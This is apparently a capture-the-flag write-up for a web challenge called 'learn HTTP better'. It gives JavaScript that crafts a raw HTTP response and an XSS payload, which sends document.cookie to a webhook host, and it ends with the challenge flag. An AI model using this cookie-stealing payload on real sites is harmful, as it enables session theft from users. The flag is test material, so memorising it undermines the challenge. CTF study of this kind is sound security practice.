# web/learn HTTP better
## get sample of token
```js
build = (p) => "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: "+p.length+"\r\n\r\n"+p
build_url = (p) => `http://localhost:5001/resp?body=${encodeURIComponent(p)}`

webhook = "???"
img = `<img src=x id="abc" />`
script = `abc.src="${webhook}/" + document.cookie`
payload = `${img} <script defer src="${build_url(build(script))}"></script>`;
payload = build(payload)
```

## After this, do the same thing as a previous challenge

`pearl{w0w_7hat_w4s_0ut_Of_th3_boX}`